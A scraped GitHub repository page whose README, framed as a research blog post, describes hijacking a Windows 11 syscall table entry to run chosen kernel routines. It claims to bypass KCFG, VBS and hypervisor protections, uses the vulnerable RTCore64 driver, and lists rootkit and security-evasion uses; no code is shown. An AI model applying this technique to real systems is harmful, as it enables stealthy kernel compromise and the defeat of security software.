data-testid="latest-commit-html"><a data-hovercard-url="/V-i-x-x/win11-kernel-execution-syscall-hijack/commit/b3f7bc47cc6c0c7927b42469aa78975aa4d37ef7/hovercard" data-pjax="true" class="Link--secondary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/commit/b3f7bc47cc6c0c7927b42469aa78975aa4d37ef7" aria-keyshortcuts="Alt+ArrowUp">Update Readme.md</a></span></div></div><span class="d-flex d-sm-none fgColor-muted f6"><relative-time tense="past" datetime="2026-06-07T21:33:49.000Z" title="Jun 7, 2026, 5:33 PM EDT"><span part="root">2 weeks ago</span>Jun 7, 2026</relative-time></span></div><div class="d-flex flex-shrink-0 gap-2"><div data-testid="latest-commit-details" class="d-none d-sm-flex flex-items-center"><span class="d-flex flex-nowrap fgColor-muted f6"><a class="Link--secondary prc-Link-Link-9ZwDx" data-component="Link" aria-label="Commit b3f7bc4" data-hovercard-url="/V-i-x-x/win11-kernel-execution-syscall-hijack/commit/b3f7bc47cc6c0c7927b42469aa78975aa4d37ef7/hovercard" data-hovercard-type="commit" octo-click="hovercard-link-click" octo-dimensions="link_type:self" aria-keyshortcuts="Alt+ArrowUp" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/commit/b3f7bc47cc6c0c7927b42469aa78975aa4d37ef7" data-discover="true">b3f7bc4</a>&nbsp;·&nbsp;<relative-time tense="past" datetime="2026-06-07T21:33:49.000Z" title="Jun 7, 2026, 5:33 PM EDT"><span part="root">2 weeks ago</span>Jun 7, 2026</relative-time></span></div><div class="d-flex gap-2"><h2 class="sr-only ScreenReaderHeading-module__userSelectNone__rwWIk prc-Heading-Heading-MtWFE" data-component="Heading" data-testid="screen-reader-heading">History</h2><a data-component="LinkButton" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/commits/main/" class="prc-Button-ButtonBase-9n-Xk d-none d-lg-flex LinkButton-module__linkButton__nFnov flex-items-center fgColor-default" data-loading="false" data-size="small" data-variant="invisible"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-history" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m.427 1.927 1.215 1.215a8.002 8.002 0 1 1-1.6 5.685.75.75 0 1 1 1.493-.154 6.5 6.5 0 1 0 1.18-4.458l1.358 1.358A.25.25 0 0 1 3.896 6H.25A.25.25 0 0 1 0 5.75V2.104a.25.25 0 0 1 .427-.177ZM7.75 4a.75.75 0 0 1 .75.75v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5A.75.75 0 0 1 7.75 4Z"></path></svg></span><span data-component="text" class="prc-Button-Label-FWkx3"><span class="fgColor-default">6 Commits</span></span></span></a><div class="d-sm-none"><button data-component="IconButton" type="button" aria-pressed="false" aria-expanded="false" data-testid="latest-commit-details-toggle" class="prc-Button-ButtonBase-9n-Xk LatestCommit-module__IconButton__mkJr_ prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="small" data-variant="invisible" aria-labelledby="_r_7_"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-ellipsis" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="M0 5.75C0 4.784.784 4 1.75 4h12.5c.966 0 1.75.784 1.75 1.75v4.5A1.75 1.75 0 0 1 14.25 12H1.75A1.75 1.75 0 0 1 0 10.25ZM12 7a1 1 0 1 0 0 2 1 1 0 0 0 0-2ZM7 8a1 1 0 1 0 2 0 1 1 0 0 0-2 0ZM4 7a1 1 0 1 0 0 2 1 1 0 0 0 0-2Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="s" data-component="Tooltip" aria-hidden="true" id="_r_7_" popover="auto">Open commit details</span></div><div class="d-flex d-lg-none"><a data-component="LinkButton" aria-label="View commit history for this file." href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/commits/main/" class="prc-Button-ButtonBase-9n-Xk LinkButton-module__linkButton__nFnov flex-items-center fgColor-default" data-loading="false" data-size="small" data-variant="invisible" aria-describedby="_R_iqj6oql3al1d_"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-history" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m.427 1.927 1.215 1.215a8.002 8.002 0 1 1-1.6 5.685.75.75 0 1 1 1.493-.154 6.5 6.5 0 1 0 1.18-4.458l1.358 1.358A.25.25 0 0 1 3.896 6H.25A.25.25 0 0 1 0 5.75V2.104a.25.25 0 0 1 .427-.177ZM7.75 4a.75.75 0 0 1 .75.75v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5A.75.75 0 0 1 7.75 4Z"></path></svg></span></span></a><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="s" data-component="Tooltip" role="tooltip" aria-hidden="true" id="_R_iqj6oql3al1d_" popover="auto">6 Commits</span></div></div></div></div></td></tr><tr class="react-directory-row undefined" id="folder-row-0"><td class="react-directory-row-name-cell-small-screen" colspan="2"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="KernelCodeExecution" aria-label="KernelCodeExecution, (Directory)" class="Link--primary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/tree/main/KernelCodeExecution" data-discover="true">KernelCodeExecution</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colspan="1"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="KernelCodeExecution" aria-label="KernelCodeExecution, (Directory)" class="Link--primary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/tree/main/KernelCodeExecution" data-discover="true">KernelCodeExecution</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div><div class="react-directory-commit-message"><a data-pjax="true" title="Arguments Supports and 2 new Features
+
+/privesc and /ppl + Arguments supports for researchers." class="Link--secondary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/commit/ff4e87f74687ef9900d55da2a3c8c778065e617a">Arguments Supports and 2 new Features</a></div></div></td><td><div class="react-directory-commit-age"><relative-time tense="past" datetime="2026-06-07T14:05:28.000Z" title="Jun 7, 2026, 10:05 AM EDT"><span part="root">2 weeks ago</span>Jun 7, 2026</relative-time></div></td></tr><tr class="react-directory-row undefined" id="folder-row-1"><td class="react-directory-row-name-cell-small-screen" colspan="2"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="screenshots" aria-label="screenshots, (Directory)" class="Link--primary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/tree/main/screenshots" data-discover="true">screenshots</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colspan="1"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file-directory-fill icon-directory" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25v-8.5A1.75 1.75 0 0 0 14.25 3H7.5a.25.25 0 0 1-.2-.1l-.9-1.2C6.07 1.26 5.55 1 5 1H1.75Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="screenshots" aria-label="screenshots, (Directory)" class="Link--primary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/tree/main/screenshots" data-discover="true">screenshots</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div><div class="react-directory-commit-message"><a data-pjax="true" title="Fix Readme
+
+Fix Readme" class="Link--secondary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/commit/f6e5a3078c61f663a8e23cc215ea8d9be48b5c57">Fix Readme</a></div></div></td><td><div class="react-directory-commit-age"><relative-time tense="past" datetime="2025-06-07T14:09:55.000Z" title="Jun 7, 2025, 10:09 AM EDT"><span part="root">last year</span>Jun 7, 2025</relative-time></div></td></tr><tr class="react-directory-row undefined" id="folder-row-2"><td class="react-directory-row-name-cell-small-screen" colspan="2"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="Readme.md" aria-label="Readme.md, (File)" class="Link--primary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/blob/main/Readme.md" data-discover="true">Readme.md</a></div></div></div></div></td><td class="react-directory-row-name-cell-large-screen" colspan="1"><div class="react-directory-filename-column"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-file color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg><div class="overflow-hidden"><div class="react-directory-filename-cell"><div class="react-directory-truncate"><a title="Readme.md" aria-label="Readme.md, (File)" class="Link--primary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/blob/main/Readme.md" data-discover="true">Readme.md</a></div></div></div></div></td><td class="react-directory-row-commit-cell"><div><div class="react-directory-commit-message"><a data-pjax="true" title="Update Readme.md" class="Link--secondary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/commit/b3f7bc47cc6c0c7927b42469aa78975aa4d37ef7">Update Readme.md</a></div></div></td><td><div class="react-directory-commit-age"><relative-time tense="past" datetime="2026-06-07T21:33:49.000Z" title="Jun 7, 2026, 5:33 PM EDT"><span part="root">2 weeks ago</span>Jun 7, 2026</relative-time></div></td></tr><tr class="d-none DirectoryContent-module__Box_4__RhIsE" data-testid="view-all-files-row"><td colspan="3" class="DirectoryContent-module__Box_5__GaE8N"><div><button class="prc-Link-Link-9ZwDx" data-component="Link">View all files</button></div></td></tr></tbody></table></div><div class="OverviewRepoFiles-module__Box_1__OXeac"><div class="OverviewRepoFiles-module__Box_2__zsLGk"><div itemscope="" itemtype="https://schema.org/abstract" class="OverviewRepoFiles-module__Box_3__bBU1C"><h2 class="prc-src-InternalVisuallyHidden-2YaI6">Repository files navigation</h2><button data-component="ActionMenu.Button" type="button" aria-label="Outline" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-9n-Xk OverviewRepoFiles-module__ActionMenu_Button__OKDYV" data-loading="false" data-size="medium" data-variant="invisible" id="_R_r8ql3al1d_" style="anchor-name: --anchored-overlay-anchor-_R_3r8ql3al1dH1_;"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-list-unordered" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M5.75 2.5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 0-1.5Zm0 5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 0-1.5Zm0 5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 0-1.5ZM2 14a1 1 0 1 1 0-2 1 1 0 0 1 0 2Zm1-6a1 1 0 1 1-2 0 1 1 0 0 1 2 0ZM2 4a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg></button></div><div class="js-snippet-clipboard-copy-unpositioned DirectoryRichtextContent-module__SharedMarkdownContent__hHXUL" data-hpc="true" containertiming="hpc"><article class="markdown-body entry-content container-lg" itemprop="text"><div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">🚀 Blog Title: Executing Kernel Routines via Syscall Table Hijack</h2><a id="user-content--blog-title-executing-kernel-routines-via-syscall-table-hijack" class="anchor" aria-label="Permalink: 🚀 Blog Title: Executing Kernel Routines via Syscall Table Hijack" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-blog-title-executing-kernel-routines-via-syscall-table-hijack"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">🔍 Overview</h3><a id="user-content--overview" class="anchor" aria-label="Permalink: 🔍 Overview" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-overview"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">This post demonstrates a powerful kernel-mode code execution technique by <strong>temporarily hijacking the syscall dispatch table</strong> in Windows — specifically the <code>KiServiceTable</code>. The idea is to:</p>
+<ul dir="auto">
+<li>Flip page permissions at the PDE level to allow writing to what is normally read-only memory.</li>
+<li>Overwrite a specific syscall entry (<code>NtSetQuotaInformationFile</code>) with the address of another kernel routine of our choosing (<code>PsLookupProcessByProcessId</code> in this example).</li>
+<li>Trigger the syscall to execute our chosen routine.</li>
+<li>Restore everything afterward to maintain stability and reduce detection.</li>
+</ul>
+<p dir="auto">What makes this method particularly potent is that it <strong>bypasses multiple modern defenses</strong>:</p>
+<ul dir="auto">
+<li>✅ <strong>KCFG</strong> (Kernel Control Flow Guard)</li>
+<li>✅ <strong>KCET</strong> (Kernel Code Execution Prevention)</li>
+<li>✅ <strong>W^X</strong> (Write XOR Execute memory protections)</li>
+<li>✅ <strong>Hypervisor-based protections</strong></li>
+<li>✅ <strong>VBS</strong> (Virtualization-Based Security)</li>
+</ul>
+<blockquote>
+<p dir="auto"><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> <strong>Note</strong>: This is intended for educational and research purposes only. Unauthorized use may violate laws and policies.</p>
+</blockquote>
+<p dir="auto"><strong>It doesn’t have to be a full routine — you can hijack the syscall to jump to a kernel-mode ROP gadget and even chain multiple gadgets for advanced execution</strong></p>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">🧨 Offensive Applications &amp; APT Use Cases</h3><a id="user-content--offensive-applications--apt-use-cases" class="anchor" aria-label="Permalink: 🧨 Offensive Applications &amp; APT Use Cases" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-offensive-applications--apt-use-cases"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Advanced Persistent Threat (APT) groups and sophisticated attackers can leverage this technique to:</p>
+<ul dir="auto">
+<li>🧬 Build stealthy kernel-mode rootkits</li>
+<li>🔗 Chain multiple legitimate kernel routine calls</li>
+<li>🧠 Subvert security software from kernel context</li>
+<li>☠️ Target hypervisors via nested virtualization or hypercalls</li>
+</ul>
+<blockquote>
+<p dir="auto"><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> This makes it a powerful post-exploitation tool when kernel code execution is already achieved.</p>
+</blockquote>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">🔑 Starting Point: Gaining a Read/Write Primitive</h3><a id="user-content--starting-point-gaining-a-readwrite-primitive" class="anchor" aria-label="Permalink: 🔑 Starting Point: Gaining a Read/Write Primitive" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-starting-point-gaining-a-readwrite-primitive"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Before we can perform any of the actions described in this post, we need a reliable <strong>read/write primitive</strong> in kernel space. This technique assumes that you already have one — in our case, I used the well-known <strong>RTCore64</strong> driver to demonstrate this.</p>
+<blockquote>
+<p dir="auto">🧪 RTCore64, originally distributed with MSI Afterburner, is known for exposing ring-0 memory access through IOCTLs, which makes it useful for research and educational exploitation scenarios.</p>
+</blockquote>
+<p dir="auto">Once you have read/write capabilities in kernel memory, your options dramatically expand. Some of the things you can do include:</p>
+<ul dir="auto">
+<li>🔍 Read kernel structures (like <code>EPROCESS</code>, <code>KTHREAD</code>, etc.)</li>
+<li>🔧 Modify kernel objects (e.g., token stealing for privilege escalation)</li>
+<li>📌 Disable or patch hooks placed by security software</li>
+<li>🔁 Swap function pointers to hijack execution (as done in this post)</li>
+<li>🔒 Circumvent memory protection mechanisms by flipping PTE/PDE flags</li>
+</ul>
+<p dir="auto">This blog focuses on the <strong>syscall hijack</strong> method, but it's just one of many paths you can take once a read/write primitive is obtained.</p>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">📚 Prerequisites</h3><a id="user-content--prerequisites" class="anchor" aria-label="Permalink: 📚 Prerequisites" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-prerequisites"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">To fully understand and follow along with this post, you should have:</p>
+<ul dir="auto">
+<li>⚙️ <strong>Windows Kernel Internals Knowledge</strong> – Familiarity with system service dispatching, EPROCESS structures, and common kernel routines.</li>
+<li>🧠 <strong>Memory Exploitation Fundamentals</strong> – Understanding of read/write primitives and how they’re used in kernel-mode exploitation.</li>
+<li>🧮 <strong>Paging &amp; Virtual Memory</strong> – In-depth knowledge of Windows memory management, particularly how <strong>PTEs (Page Table Entries)</strong> and <strong>PDEs (Page Directory Entries)</strong> control memory access and permissions.</li>
+<li>🛠️ <strong>Windbg / Kernel Debugging Experience</strong> – Ability to navigate and extract data from kernel debug sessions using Windbg.</li>
+</ul>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">🧠 Key Concepts</h3><a id="user-content--key-concepts" class="anchor" aria-label="Permalink: 🧠 Key Concepts" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-key-concepts"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<ul dir="auto">
+<li><strong><code>KiServiceTable</code></strong>: The internal Windows table used by the syscall dispatcher to resolve syscall numbers to actual kernel function addresses.</li>
+<li><strong>PTE/PDE Manipulation</strong>: Changing page table and directory flags to override memory protection (e.g., enabling write access).</li>
+<li><strong>Syscall Hijacking</strong>: Replacing a legitimate syscall entry with a custom or unintended routine to gain controlled execution in kernel mode.</li>
+<li><strong><code>PsLookupProcessByProcessId</code></strong>: A useful kernel function that resolves a <code>PID</code> to an <code>EPROCESS</code> structure pointer — often used in privilege escalation and kernel object manipulation.</li>
+</ul>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Hijacking NtSetQuotaInformationFile Syscall</h3><a id="user-content-hijacking-ntsetquotainformationfile-syscall" class="anchor" aria-label="Permalink: Hijacking NtSetQuotaInformationFile Syscall" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#hijacking-ntsetquotainformationfile-syscall"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">We chose to hijack <code>NtSetQuotaInformationFile</code> specifically because it's a <strong>rarely used syscall in most environments</strong>. This minimizes the chance of interference with normal system operations (BSOD).</p>
+<p dir="auto">The goal is to <strong>hijack the syscall of <code>NtSetQuotaInformationFile</code></strong> and redirect it to another kernel-mode routine or gadget of our choosing (e.g., <code>nt!PsLookupProcessByProcessId</code>).</p>
+<p dir="auto">To accomplish this, we must:</p>
+<ol dir="auto">
+<li>Identify the syscall number for <code>NtSetQuotaInformationFile</code>.</li>
+<li>Locate and modify the corresponding entry in the <code>nt!KiServiceTable</code>.</li>
+<li>Overcome memory protection to allow editing the read-only service table.</li>
+</ol>
+<p dir="auto"><strong>It doesn’t have to be a full routine — you can hijack the syscall to jump to a kernel-mode ROP gadget and even chain multiple gadgets for advanced execution</strong></p>
+<hr>
